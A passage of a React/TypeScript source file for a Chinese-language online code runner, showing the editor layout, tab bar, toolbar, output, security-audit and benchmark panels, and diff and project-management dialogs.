  const outputIsTabular = activeTab.result?.stdout ? isTabular(activeTab.result.stdout) : false;
  const tableData = outputIsTabular && activeTab.result?.stdout ? parseTable(activeTab.result.stdout) : null;

  const severityColor = (s: string) => s === 'critical' ? 'text-red-400 bg-red-500/10 border-red-500/30' : s === 'high' ? 'text-orange-400 bg-orange-500/10 border-orange-500/30' : s === 'medium' ? 'text-yellow-400 bg-yellow-500/10 border-yellow-500/30' : 'text-blue-400 bg-blue-500/10 border-blue-500/30';

  return (
    <div className={`min-h-screen bg-[#0a0f18] text-gray-100 ${isFullscreen ? 'overflow-hidden' : ''}`}>
      <div className={`${isFullscreen ? 'h-screen flex flex-col p-3' : 'max-w-7xl mx-auto px-4 py-6'}`}>
        {/* 头部 */}
        {!isFullscreen && (
          <motion.div initial={{ opacity: 0, y: -20 }} animate={{ opacity: 1, y: 0 }} className="mb-4">
            <div className="flex items-center gap-3 mb-2">
              <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-cyber-green to-emerald-500 flex items-center justify-center">
                <Terminal size={22} className="text-black" />
              </div>
              <div>
                <h1 className="text-2xl font-bold bg-gradient-to-r from-cyber-green to-emerald-400 bg-clip-text text-transparent">代码运行中心</h1>
                <p className="text-gray-500 text-sm">多标签编辑 · 安全审计 · 性能基准 · 分屏模式 · Ctrl+Enter 运行</p>
              </div>
            </div>
          </motion.div>
        )}

        <div className={`${isFullscreen ? 'flex-1 flex flex-col min-h-0' : `grid gap-3 ${showHistory && !isFullscreen ? 'lg:grid-cols-[1fr,280px]' : 'grid-cols-1'}`}`}>
          {/* 主区域 */}
          <div className={`space-y-3 ${isFullscreen ? 'flex-1 flex flex-col min-h-0' : ''}`}>
            {/* A. 标签栏 */}
            <div className="flex items-center gap-1 bg-[#111827]/80 border border-white/10 rounded-xl p-2 overflow-x-auto">
              {tabs.map(tab => (
                <div key={tab.id} className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-sm transition-all cursor-pointer whitespace-nowrap group ${
                  tab.id === activeTabId ? 'bg-cyber-green/15 text-cyber-green border border-cyber-green/20' : 'text-gray-400 hover:text-gray-200 hover:bg-white/5 border border-transparent'
                }`}>
                  {editingTabId === tab.id ? (
                    <input
                      className="bg-transparent border-b border-cyber-green/50 outline-none w-20 text-center text-xs"
                      value={editingTabName}
                      onChange={e => setEditingTabName(e.target.value)}
                      onBlur={() => { renameTab(tab.id, editingTabName || tab.name); setEditingTabId(null); }}
                      onKeyDown={e => { if (e.key === 'Enter') { renameTab(tab.id, editingTabName || tab.name); setEditingTabId(null); } }}
                      autoFocus
                      onClick={e => e.stopPropagation()}
                    />
                  ) : (
                    <span
                      onClick={() => setActiveTabId(tab.id)}
                      onDoubleClick={() => { setEditingTabId(tab.id); setEditingTabName(tab.name); }}
                      className="text-xs max-w-[100px] truncate"
                      title={tab.name}
                    >
                      {tab.name}
                    </span>
                  )}
                  {tab.result && (
                    <span className={`w-1.5 h-1.5 rounded-full flex-shrink-0 ${tab.result.success ? 'bg-green-400' : tab.result.killed ? 'bg-yellow-400' : 'bg-red-400'}`} />
                  )}
                  {tabs.length > 1 && (
                    <button onClick={e => { e.stopPropagation(); closeTab(tab.id); }} className="text-gray-600 hover:text-red-400 opacity-0 group-hover:opacity-100 transition-all flex-shrink-0">
                      <X size={12} />
                    </button>
                  )}
                </div>
              ))}
              <button onClick={() => addTab()} className="p-1.5 rounded-lg text-gray-500 hover:text-cyber-green hover:bg-white/5 transition-all flex-shrink-0" title="新建标签页">
                <Plus size={16} />
              </button>
            </div>

            {/* 工具栏 */}
            <div className="glass-card rounded-xl p-3 border border-white/10 bg-[#111827]/80">
              <div className="flex items-center justify-between flex-wrap gap-2">
                {/* 运行时选择 */}
                <div className="flex items-center gap-2">
                  {runtimesLoading ? (
                    <div className="flex items-center gap-2 text-gray-500"><Loader2 size={14} className="animate-spin" /><span className="text-xs">检测中...</span></div>
                  ) : runtimesError ? (
                    <div className="flex items-center gap-2 text-red-400"><AlertTriangle size={14} /><span className="text-xs">{runtimesError}</span></div>
                  ) : (
                    <div className="flex bg-[#1a2235] rounded-lg p-1 gap-1">
                      {runtimes.map(rt => (
                        <button key={rt.id} onClick={() => switchLanguage(rt.id)}
                          className={`px-3 py-1.5 rounded-md text-xs font-medium transition-all flex items-center gap-1.5 ${
                            activeTab.language === rt.id ? 'bg-cyber-green/20 text-cyber-green' : 'text-gray-400 hover:text-gray-200'
                          }`}
                        ><span>{rt.icon}</span><span className="hidden sm:inline">{rt.name}</span></button>
                      ))}
                    </div>
                  )}
                </div>

                {/* 操作按钮组 */}
                <div className="flex items-center gap-1 flex-wrap">
                  {/* B. 分屏切换 */}
                  <button onClick={() => setViewMode(v => v === 'stacked' ? 'split' : 'stacked')}
                    className={`p-1.5 rounded-lg transition-colors ${viewMode === 'split' ? 'text-cyber-green bg-cyber-green/10' : 'text-gray-400 hover:text-gray-200'}`}
                    title={viewMode === 'split' ? '切换为上下布局' : '切换为左右分屏'}
                  ><Columns2 size={16} /></button>
                  <span className="w-px h-5 bg-white/10 mx-0.5" />

                  {/* C. 安全审计 */}
                  <button onClick={handleAudit} disabled={isAuditing || !activeTab.code.trim()}
                    className={`p-1.5 rounded-lg transition-colors ${rightPanelTab === 'audit' && auditResult ? 'text-purple-400 bg-purple-500/10' : 'text-gray-400 hover:text-purple-400'}`}
                    title="安全代码审计"
                  >{isAuditing ? <Loader2 size={16} className="animate-spin" /> : <Shield size={16} />}</button>

                  {/* D. 性能基准 */}
                  <button onClick={handleBenchmark} disabled={isBenchmarking || !activeTab.code.trim()}
                    className={`p-1.5 rounded-lg transition-colors ${rightPanelTab === 'benchmark' && benchmarkResult ? 'text-cyan-400 bg-cyan-500/10' : 'text-gray-400 hover:text-cyan-400'}`}
                    title="性能基准测试"
                  ><Gauge size={16} /></button>

                  {/* E. 代码Diff */}
                  <button onClick={() => { setShowDiff(true); setDiffLeft(null); setDiffRight(null); }}
                    className="p-1.5 rounded-lg text-gray-400 hover:text-yellow-400 transition-colors" title="代码Diff对比"
                  ><GitCompare size={16} /></button>
                  <span className="w-px h-5 bg-white/10 mx-0.5" />

                  {/* F. 项目保存/加载 */}
                  <button onClick={loadProjects} className="p-1.5 rounded-lg text-gray-400 hover:text-blue-400 transition-colors" title="项目保存/加载">
                    <FolderOpen size={16} /></button>

                  <button onClick={() => setShowSnippets(true)} className="p-1.5 rounded-lg text-gray-400 hover:text-amber-400 transition-colors" title="代码片段库">
                    <BookOpen size={16} /></button>
                  <button onClick={handleReset} className="p-1.5 rounded-lg text-gray-400 hover:text-gray-200 transition-colors" title="重置">
                    <RotateCcw size={16} /></button>
                  <button onClick={handleFormat} className="p-1.5 rounded-lg text-gray-400 hover:text-blue-400 transition-colors" title="格式化">
                    <Brush size={16} /></button>
                  <button onClick={handleDownload} disabled={!activeTab.code.trim()} className="p-1.5 rounded-lg text-gray-400 hover:text-blue-400 transition-colors disabled:opacity-30" title="下载代码">
                    <FileDown size={16} /></button>
                  <button onClick={() => setShowHistory(!showHistory)}
                    className={`p-1.5 rounded-lg transition-colors ${showHistory ? 'text-cyber-green bg-cyber-green/10' : 'text-gray-400'}`}
                    title="历史面板"
                  >{showHistory ? <PanelLeftClose size={16} /> : <PanelLeftOpen size={16} />}</button>
                  <button onClick={toggleFullscreen} className="p-1.5 rounded-lg text-gray-400 hover:text-gray-200 transition-colors" title="全屏">
                    {isFullscreen ? <Minimize2 size={16} /> : <Maximize2 size={16} />}</button>

                  {/* 运行按钮 */}
                  <button onClick={runCode} disabled={isRunning || !activeTab.code.trim()}
                    className={`px-4 py-1.5 rounded-lg font-medium text-xs flex items-center gap-1.5 transition-all ml-1 ${
                      isRunning ? 'bg-yellow-600/30 text-yellow-400' : !activeTab.code.trim() ? 'bg-gray-700/50 text-gray-500 cursor-not-allowed'
                        : 'bg-gradient-to-r from-cyber-green to-emerald-500 text-black hover:shadow-lg hover:shadow-cyber-green/25 active:scale-95'
                    }`}
                  >{isRunning ? <><Loader2 size={14} className="animate-spin" />执行中</> : <><Play size={14} />运行 <span className="text-xs opacity-60 hidden sm:inline">⌃↵</span></>}</button>
                  {isRunning && <button onClick={handleStop} className="p-1.5 rounded-lg text-red-400 hover:bg-red-500/10" title="停止"><Square size={14} /></button>}
                </div>
              </div>

              {/* 运行时信息栏 */}
              {activeRuntime && (
                <div className="mt-2 pt-2 border-t border-white/5 flex items-center gap-3 text-xs text-gray-500 flex-wrap">
                  <span className="flex items-center gap-1"><span className="w-1.5 h-1.5 rounded-full bg-green-400" />{activeRuntime.name} {activeRuntime.version}</span>
                  <span className="flex items-center gap-1"><Clock size={10} />超时: {activeRuntime.id === 'java' ? '15s' : '10s'}</span>
                  <span className="flex items-center gap-1"><Keyboard size={10} />Ctrl+Enter 运行</span>
                  {activeRuntime.id === 'java' && !activeRuntime.hasJavac && <span className="flex items-center gap-1 text-yellow-400"><AlertTriangle size={10} />javac 未检测到</span>}
                  <span className="flex items-center gap-1 text-amber-600/70 ml-auto"><AlertTriangle size={10} />代码拥有完整系统权限，请勿执行不受信任的代码</span>
                </div>
              )}
            </div>

            {/* G. stdin + 命令行参数输入 */}
            <div className="glass-card rounded-xl border border-white/10 bg-[#111827]/80 p-3">
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <div>
                  <div className="flex items-center gap-2 mb-1.5">
                    <span className="text-xs font-medium text-gray-400 uppercase tracking-wider">📥 标准输入 (stdin)</span>
                  </div>
                  <textarea value={activeTab.stdin} onChange={e => updateActiveTab({ stdin: e.target.value })}
                    placeholder="input() / Scanner 读取的数据，每行一个值..."
                    rows={2} className="w-full bg-[#0a0e14] border border-white/5 rounded-lg px-3 py-1.5 text-xs text-gray-300 font-mono resize-none focus:outline-none focus:border-cyber-green/30 placeholder-gray-600"
                  />
                </div>
                {/* G. 命令行参数 */}
                <div>
                  <div className="flex items-center gap-2 mb-1.5">
                    <span className="text-xs font-medium text-gray-400 uppercase tracking-wider">⚙️ 命令行参数 (CLI Args)</span>
                  </div>
                  <input value={activeTab.args} onChange={e => updateActiveTab({ args: e.target.value })}
                    placeholder="空格分隔的参数，如: --debug --port 8080 input.txt"
                    className="w-full bg-[#0a0e14] border border-white/5 rounded-lg px-3 py-1.5 text-xs text-gray-300 font-mono focus:outline-none focus:border-cyber-green/30 placeholder-gray-600"
                  />
                </div>
              </div>
            </div>

            {/* B. 分屏：代码编辑器 + 输出面板 */}
            <div className={`${viewMode === 'split' ? 'grid grid-cols-1 lg:grid-cols-2 gap-3 flex-1 min-h-0' : 'space-y-3'}`}>
              {/* 代码编辑器 */}
              <motion.div layout className="rounded-xl overflow-hidden border border-white/10 bg-[#111827] flex flex-col"
                style={{ minHeight: isFullscreen ? 0 : (viewMode === 'split' ? '500px' : '400px'), flex: isFullscreen ? 1 : undefined }}>
                <Editor
                  height={isFullscreen ? '100%' : (viewMode === 'split' ? '500px' : '400px')}
                  language={activeTab.language === 'javascript' ? 'javascript' : activeTab.language === 'java' ? 'java' : 'python'}
                  value={activeTab.code}
                  onChange={v => updateActiveTab({ code: v || '' })}
                  theme="vs-dark"
                  onMount={editor => {
                    editorRef.current = editor;
                    editor.addAction({ id: 'run-code', label: '运行代码', keybindings: [2048 | 3], run: () => runCodeRef.current() });
                  }}
                  options={{
                    fontSize: isFullscreen ? 15 : 14,
                    fontFamily: "'JetBrains Mono','Fira Code','Cascadia Code',Consolas,monospace",
                    minimap: { enabled: false }, lineNumbers: 'on', renderWhitespace: 'selection',
                    tabSize: 4, bracketPairColorization: { enabled: true }, automaticLayout: true,
                    scrollBeyondLastLine: false, padding: { top: 16 }, wordWrap: 'on', glyphMargin: true,
                  }}
                />
              </motion.div>

              {/* 右侧面板：输出 / 审计 / 基准 */}
              <motion.div layout ref={outputRef} className="rounded-xl border border-white/10 bg-[#111827] overflow-hidden flex flex-col"
                style={{ minHeight: viewMode === 'split' ? 0 : '120px', maxHeight: viewMode === 'split' ? undefined : '400px' }}>
                {/* 面板标签 */}
                <div className="flex items-center border-b border-white/5 bg-[#0d1520]">
                  {(['output', 'audit', 'benchmark'] as const).map(panel => (
                    <button key={panel} onClick={() => setRightPanelTab(panel)}
                      className={`px-4 py-2.5 text-xs font-medium transition-all border-b-2 ${
                        rightPanelTab === panel ? 'border-cyber-green text-cyber-green' : 'border-transparent text-gray-500 hover:text-gray-300'
                      }`}
                    >
                      {panel === 'output' ? <>📤 输出结果 {activeTab.result && <span className="ml-1 text-green-400">●</span>}</>
                        : panel === 'audit' ? <>🛡️ 安全审计 {auditResult && <span className={`ml-1 ${auditResult.summary.total > 0 ? 'text-red-400' : 'text-green-400'}`}>●</span>}</>
                        : <>⚡ 基准测试 {benchmarkResult && <span className="ml-1 text-cyan-400">●</span>}</>}
                    </button>
                  ))}
                  <div className="ml-auto flex items-center gap-1 pr-2">
                    {activeTab.result && <button onClick={clearOutput} className="p-1 rounded text-gray-500 hover:text-gray-300" title="清除"><Eraser size={12} /></button>}
                    {activeTab.result && (activeTab.result.stdout || activeTab.result.stderr) && (
                      <button onClick={copyOutput} className="p-1 rounded text-gray-500 hover:text-gray-300" title="复制">{copied ? <Check size={12} className="text-green-400" /> : <Copy size={12} />}</button>
                    )}
                  </div>
                </div>

                <div className="p-4 font-mono text-sm overflow-auto flex-1 bg-[#0a0e14]">
                  {/* 输出面板 */}
                  {rightPanelTab === 'output' && (
                    isRunning ? <div className="flex items-center gap-2 text-yellow-400"><Loader2 size={14} className="animate-spin" />执行中...</div>
                    : activeTab.result ? (
                      <div className="space-y-2">
                        {activeTab.result.stdout && (
                          outputIsTabular && tableData ? (
                            /* H. 表格渲染 */
                            <div className="overflow-x-auto">
                              <table className="w-full text-xs border-collapse">
                                <thead>
                                  <tr className="bg-[#1a2235]">{tableData.headers.map((h, i) => <th key={i} className="border border-white/10 px-2 py-1 text-left text-cyber-green">{h}</th>)}</tr>
                                </thead>
                                <tbody>
                                  {tableData.rows.map((row, ri) => (
                                    <tr key={ri} className="hover:bg-white/5">
                                      {row.map((cell, ci) => <td key={ci} className="border border-white/5 px-2 py-0.5 text-gray-300">{cell}</td>)}
                                    </tr>
                                  ))}
                                </tbody>
                              </table>
                            </div>
                          ) : <pre className="text-green-300 whitespace-pre-wrap break-words leading-relaxed">{activeTab.result.stdout}</pre>
                        )}
                        {activeTab.result.stderr && <pre className="text-red-400 whitespace-pre-wrap break-words leading-relaxed border-t border-red-500/10 pt-2 mt-2">{activeTab.result.stderr}</pre>}
                        {!activeTab.result.stdout && !activeTab.result.stderr && <span className="text-gray-500 italic">(无输出)</span>}
                        {activeTab.result.executionTime != null && (
                          <div className="text-xs text-gray-500 pt-2 border-t border-white/5 mt-2">
                            执行耗时: {activeTab.result.executionTime}ms · 退出码: {activeTab.result.exitCode}
                            {activeTab.result.killed ? ' · 进程被终止' : ''}
                          </div>
                        )}
                      </div>
                    ) : <div className="flex items-center gap-2 text-gray-600"><Info size={14} /><span>点击「运行」或 Ctrl+Enter 查看输出</span></div>
                  )}

                  {/* C. 审计面板 */}
                  {rightPanelTab === 'audit' && (
                    <SecurityAudit isAuditing={isAuditing} auditResult={auditResult} severityColor={severityColor} />
                  )}

                  {/* D. 基准测试面板 */}
                  {rightPanelTab === 'benchmark' && (
                    <PerfBenchmark
                      isBenchmarking={isBenchmarking}
                      benchmarkResult={benchmarkResult}
                      benchmarkRuns={benchmarkRuns}
                      onBenchmarkRunsChange={setBenchmarkRuns}
                      onStartBenchmark={handleBenchmark}
                      onReturnOutput={() => setRightPanelTab('output')}
                      hasCode={!!activeTab.code.trim()}
                    />
                  )}
                </div>
              </motion.div>
            </div>
          </div>

          {/* 历史侧边栏 */}
          {!isFullscreen && (
            <ExecutionHistory
              show={showHistory}
              history={history}
              runtimes={runtimes}
              diffLeft={diffLeft}
              diffRight={diffRight}
              onLoad={loadFromHistory}
              onClear={clearHistory}
              onSetDiffLeft={setDiffLeft}
              onSetDiffRight={setDiffRight}
              onShowDiff={() => setShowDiff(true)}
            />
          )}
        </div>
      </div>

      {/* ───── 弹窗：代码片段库 ───── */}
      <CodeSnippets
        show={showSnippets}
        onClose={() => setShowSnippets(false)}
        language={activeTab.language}
        languageIcon={activeRuntime?.icon || ''}
        snippets={filteredSnippets}
        categories={SNIPPET_CATEGORIES.filter(cat => SNIPPETS.some(s => s.language === activeTab.language && s.category === cat))}
        selectedCategory={snippetCategory}
        onCategoryChange={setSnippetCategory}
        onLoadSnippet={loadSnippet}
      />

      {/* ───── E. 弹窗：代码 Diff ───── */}
      <AnimatePresence>
        {showDiff && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm"
            onClick={() => setShowDiff(false)}>
            <motion.div initial={{ scale: 0.95 }} animate={{ scale: 1 }} exit={{ scale: 0.95 }}
              className="glass-card bg-[#111827] border border-white/10 rounded-2xl w-full max-w-5xl max-h-[85vh] overflow-hidden shadow-2xl"
              onClick={e => e.stopPropagation()}>
              <div className="flex items-center justify-between px-5 py-3 border-b border-white/10 bg-[#0d1520]">
                <div className="flex items-center gap-3">
                  <div className="w-8 h-8 rounded-lg bg-gradient-to-br from-yellow-400 to-orange-500 flex items-center justify-center"><GitCompare size={16} className="text-black" /></div>
                  <div><h3 className="text-sm font-semibold text-gray-100">代码 Diff 对比</h3><p className="text-xs text-gray-500">从执行历史中选择两次记录进行对比</p></div>
                </div>
                <button onClick={() => { setShowDiff(false); setDiffLeft(null); setDiffRight(null); }} className="p-2 rounded-full text-gray-400 hover:text-gray-200"><X size={18} /></button>
              </div>

              {!diffLeft || !diffRight ? (
                <div className="p-8 text-center">
                  <p className="text-gray-400 mb-4">请从执行历史中分别选择左侧和右侧代码</p>
                  <div className="grid grid-cols-2 gap-4 text-left max-h-[50vh] overflow-auto">
                    {history.slice(0, 20).map(entry => (
                      <div key={entry.id} className="flex items-center justify-between bg-[#0a0f18] rounded-lg p-2 border border-white/5">
                        <div className="min-w-0">
                          <span className="text-xs text-gray-400">{new Date(entry.timestamp).toLocaleTimeString()} · {entry.language}</span>
                          <p className="text-xs text-gray-500 truncate">{entry.code.substring(0, 60)}</p>
                        </div>
                        <div className="flex gap-1 flex-shrink-0 ml-2">
                          <button onClick={() => setDiffLeft(entry)} className={`text-xs px-2 py-1 rounded ${diffLeft?.id === entry.id ? 'bg-yellow-500/20 text-yellow-400' : 'bg-white/5 text-gray-500'}`}>L</button>
                          <button onClick={() => setDiffRight(entry)} className={`text-xs px-2 py-1 rounded ${diffRight?.id === entry.id ? 'bg-cyan-500/20 text-cyan-400' : 'bg-white/5 text-gray-500'}`}>R</button>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              ) : (
                <div className="overflow-auto max-h-[70vh] font-mono text-xs">
                  <div className="grid grid-cols-2 divide-x divide-white/5">
                    {/* 左侧信息栏 */}
                    <div className="px-3 py-1.5 bg-[#0d1520] text-gray-500 flex items-center justify-between border-b border-white/5">
                      <span>{new Date(diffLeft.timestamp).toLocaleTimeString()} · {diffLeft.language}</span>
                      <button onClick={() => setDiffLeft(null)} className="text-gray-600 hover:text-red-400"><X size={12} /></button>
                    </div>
                    {/* 右侧信息栏 */}
                    <div className="px-3 py-1.5 bg-[#0d1520] text-gray-500 flex items-center justify-between border-b border-white/5">
                      <span>{new Date(diffRight.timestamp).toLocaleTimeString()} · {diffRight.language}</span>
                      <button onClick={() => setDiffRight(null)} className="text-gray-600 hover:text-red-400"><X size={12} /></button>
                    </div>
                  </div>
                  <div className="divide-y divide-white/5">
                    {diffLines.map((dl, i) => (
                      <div key={i} className={`grid grid-cols-2 divide-x divide-white/5 ${dl.type === 'added' ? 'bg-green-500/10' : dl.type === 'removed' ? 'bg-red-500/10' : ''}`}>
                        <div className={`px-3 py-0.5 ${dl.type === 'removed' ? 'bg-red-500/10 text-red-300' : dl.type === 'same' ? 'text-gray-400' : 'text-gray-700'}`}>
                          <span className="text-gray-600 mr-2 select-none">{dl.lineNumLeft || ''}</span>
                          {dl.type !== 'added' ? dl.content : ''}
                        </div>
                        <div className={`px-3 py-0.5 ${dl.type === 'added' ? 'bg-green-500/10 text-green-300' : dl.type === 'same' ? 'text-gray-400' : 'text-gray-700'}`}>
                          <span className="text-gray-600 mr-2 select-none">{dl.lineNumRight || ''}</span>
                          {dl.type !== 'removed' ? dl.content : ''}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* ───── F. 弹窗：项目管理 ───── */}
      <AnimatePresence>
        {showProjects && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm"
            onClick={() => setShowProjects(false)}>
            <motion.div initial={{ scale: 0.95 }} animate={{ scale: 1 }} exit={{ scale: 0.95 }}
              className="glass-card bg-[#111827] border border-white/10 rounded-2xl w-full max-w-lg max-h-[80vh] overflow-hidden shadow-2xl"
              onClick={e => e.stopPropagation()}>
              <div className="flex items-center justify-between px-5 py-3 border-b border-white/10 bg-[#0d1520]">
                <div className="flex items-center gap-3">
                  <div className="w-8 h-8 rounded-lg bg-gradient-to-br from-blue-400 to-indigo-500 flex items-center justify-center"><FolderOpen size={16} className="text-black" /></div>
                  <div><h3 className="text-sm font-semibold text-gray-100">项目管理</h3><p className="text-xs text-gray-500">保存当前标签页到项目，或加载已有项目</p></div>
                </div>
                <button onClick={() => setShowProjects(false)} className="p-2 rounded-full text-gray-400 hover:text-gray-200"><X size={18} /></button>
              </div>

              {/* 保存当前 */}
              <div className="px-5 py-3 border-b border-white/5 bg-[#0a0f18]/50">
                <div className="flex items-center gap-2">
                  <Save size={14} className="text-gray-500" />
                  <span className="text-xs text-gray-400">保存当前工作区 ({tabs.length} 个标签页):</span>
                </div>
                <div className="flex gap-2 mt-2">
                  <input value={projectName} onChange={e => setProjectName(e.target.value)}
                    placeholder="输入项目名称..."
                    className="flex-1 bg-[#1a2235] border border-white/10 rounded-lg px-3 py-1.5 text-sm text-gray-200 outline-none focus:border-blue-400/30"
                    onKeyDown={e => e.key === 'Enter' && saveProject()}
                  />
                  <button onClick={saveProject} disabled={!projectName.trim()}
                    className="px-4 py-1.5 bg-blue-500/20 text-blue-400 rounded-lg text-sm hover:bg-blue-500/30 transition-colors disabled:opacity-30">
                    保存
                  </button>
                </div>
              </div>

              {/* 项目列表 */}
              <div className="overflow-auto max-h-[45vh] p-4 space-y-2">
                {isLoadingProjects ? (
                  <div className="flex items-center justify-center py-8 text-gray-500"><Loader2 size={20} className="animate-spin" /></div>
                ) : projects.length === 0 ? (
                  <div className="text-center py-8 text-gray-600"><FolderOpen size={24} className="mx-auto mb-2 opacity-50" /><p className="text-sm">暂无保存的项目</p></div>
                ) : projects.map(p => (
                  <div key={p.id} className="flex items-center justify-between bg-[#0a0f18] rounded-lg p-3 border border-white/5 hover:border-blue-400/20 transition-all group">
                    <div className="min-w-0 flex-1">
                      <h4 className="text-sm font-medium text-gray-200">{p.name}</h4>
                      <div className="flex items-center gap-3 mt-1">
                        <span className="text-xs text-gray-500">{p.tabCount} 个标签页</span>
                        <span className="text-xs text-gray-600">{p.languages.join(', ')}</span>
                        <span className="text-xs text-gray-700">{new Date(p.updatedAt).toLocaleDateString()}</span>
                      </div>
                    </div>
                    <div className="flex items-center gap-1 opacity-0 group-hover:opacity-100 transition-all">
                      <button onClick={() => loadProject(p.id)} className="p-1.5 rounded text-blue-400 hover:bg-blue-500/10" title="加载"><FolderOpen size={14} /></button>
                      <button onClick={() => deleteProject(p.id)} className="p-1.5 rounded text-red-400 hover:bg-red-500/10" title="删除"><Trash2 size={14} /></button>
                    </div>
                  </div>
                ))}
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* CSS */}
      <style>{`
        .glass-card { backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); }
        ::-webkit-scrollbar { width: 4px; height: 4px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: #2d3748; border-radius: 2px; }
        ::-webkit-scrollbar-thumb:hover { background: #4a5568; }
        .line-clamp-3 { display: -webkit-box; -webkit-line-clamp: 3; -webkit-box-orient: vertical; overflow: hidden; }
        .error-line-highlight { background: rgba(239,68,68,0.15); }
        .error-glyph { background: rgba(239,68,68,0.8); width: 4px !important; margin-left: 5px; border-radius: 2px; }
        .audit-line-critical { background: rgba(239,68,68,0.15); }
        .audit-line-high { background: rgba(249,115,22,0.15); }
        .audit-line-medium { background: rgba(234,179,8,0.15); }
        .audit-line-low { background: rgba(59,130,246,0.1); }
        .audit-critical { background: rgba(239,68,68,0.8); width: 4px !important; margin-left: 5px; border-radius: 2px; }
        .audit-high { background: rgba(249,115,22,0.8); width: 4px !important; margin-left: 5px; border-radius: 2px; }
        .audit-medium { background: rgba(234,179,8,0.8); width: 4px !important; margin-left: 5px; border-radius: 2px; }
        .audit-low { background: rgba(59,130,246,0.5); width: 4px !important; margin-left: 5px; border-radius: 2px; }
      `}</style>
    </div>
  );
};

// ===== 1. SecurityAudit: 安全审计面板组件 =====
const SecurityAudit: React.FC<{
  isAuditing: boolean;
  auditResult: AuditResult | null;
  severityColor: (s: string) => string;
}> = ({ isAuditing, auditResult, severityColor }) => {
  if (isAuditing) {
    return (
      <div className="flex items-center justify-center h-full text-gray-500 gap-2">
        <Loader2 size={16} className="animate-spin" />
        <span>正在扫描代码安全问题...</span>
      </div>
    );
  }
  if (!auditResult) {
    return (
      <div className="flex flex-col items-center justify-center h-full text-gray-500 gap-3 p-6">
        <Shield size={32} className="opacity-50" />
        <div className="text-sm text-center">
          <p className="font-medium text-gray-400 mb-1">尚未执行安全审计</p>
          <p className="text-xs text-gray-600">点击顶部工具栏的 🛡️ 「安全审计」按钮检测代码安全问题</p>
        </div>
      </div>
    );
  }
  return (
    <div className="p-4 h-full overflow-auto">
      <div className="mb-4">
        <div className="flex items-center justify-between mb-2">
          <h4 className="text-sm font-semibold text-gray-200">安全审计结果</h4>
          <span className="text-xs text-gray-500">{auditResult.language} · {auditResult.scannedLines} 行</span>
        </div>
        <div className="grid grid-cols-5 gap-2 text-xs">
          {(['critical', 'high', 'medium', 'low'] as const).map(sev => (
            <div key={sev} className={`rounded-lg p-2 border ${severityColor(sev)} text-center`}>
              <div className="font-bold text-base">{auditResult.summary[sev]}</div>
              <div className="text-[10px] opacity-80">{sev === 'critical' ? '严重' : sev === 'high' ? '高危' : sev === 'medium' ? '中危' : '低危'}</div>
            </div>
          ))}
          <div className="rounded-lg p-2 border border-white/10 bg-white/5 text-center">
            <div className="font-bold text-base text-gray-300">{auditResult.summary.total}</div>
            <div className="text-[10px] opacity-80">总计</div>
          </div>
        </div>
      </div>

      {auditResult.findings.length === 0 ? (
        <div className="flex flex-col items-center justify-center py-8 text-green-400 gap-2">
          <Check size={24} />
          <span className="text-sm">未发现安全问题</span>
        </div>
      ) : (
        <div className="space-y-2">
          {auditResult.findings.map((f, i) => (
            <div key={i} className={`rounded-lg p-3 border ${severityColor(f.severity)}`}>
              <div className="flex items-start justify-between gap-2 mb-1">
                <span className="text-xs font-semibold uppercase tracking-wide">
                  {f.severity === 'critical' ? '严重' : f.severity === 'high' ? '高危' : f.severity === 'medium' ? '中危' : '低危'}
                </span>
                <span className="text-[10px] opacity-60">第 {f.line} 行</span>
              </div>
              <p className="text-xs text-gray-300 mb-2">{f.description}</p>
              <pre className="text-xs bg-black/30 rounded p-2 font-mono text-gray-400 overflow-auto max-h-16 mb-2">{f.snippet}</pre>
              <p className="text-xs text-blue-300">💡 {f.suggestion}</p>
            </div>
          ))}
        </div>
      )}
    </div>
  );
};

// ===== 2. PerfBenchmark: 性能基准测试面板组件 =====
const PerfBenchmark: React.FC<{
  isBenchmarking: boolean;
  benchmarkResult: BenchmarkResult | null;
  benchmarkRuns: number;
  onBenchmarkRunsChange: (n: number) => void;
  onStartBenchmark: () => void;
  onReturnOutput: () => void;
  hasCode: boolean;
}> = ({ isBenchmarking, benchmarkResult, benchmarkRuns, onBenchmarkRunsChange, onStartBenchmark, onReturnOutput, hasCode }) => {
  if (isBenchmarking) {
    return (
      <div className="flex flex-col items-center justify-center h-full text-gray-400 gap-3 p-6">
        <Gauge size={32} className="animate-spin" />
        <span className="text-sm">正在执行基准测试 ({benchmarkRuns} 次)...</span>
      </div>
    );
  }
  if (!benchmarkResult) {
    return (
      <div className="flex flex-col items-center justify-center h-full text-gray-500 gap-3 p-6">
        <Gauge size={32} className="opacity-50" />
        <div className="text-sm text-center">
          <p className="font-medium text-gray-400 mb-2">性能基准测试</p>
          <p className="text-xs text-gray-600 mb-4">重复执行代码并统计性能指标</p>
        </div>
        <div className="flex items-center gap-2 bg-[#0a0f18] rounded-lg p-3 border border-white/5">
          <span className="text-xs text-gray-400">执行次数:</span>
          <select value={benchmarkRuns} onChange={e => onBenchmarkRunsChange(Number(e.target.value))}
            className="bg-[#1a2235] border border-white/10 rounded px-2 py-1 text-xs text-gray-200">
            <option value={5}>5 次</option>
            <option value={10}>10 次</option>
            <option value={20}>20 次</option>
            <option value={50}>50 次</option>
          </select>
          <button onClick={onStartBenchmark} disabled={!hasCode}
            className="px-3 py-1 bg-blue-500/20 text-blue-400 rounded text-xs hover:bg-blue-500/30 transition-colors disabled:opacity-30">
            开始测试
          </button>
        </div>
      </div>
    );
  }
  return (
    <div className="p-4 h-full overflow-auto">
      <div className="flex items-center justify-between mb-4">
        <h4 className="text-sm font-semibold text-gray-200">性能测试结果</h4>
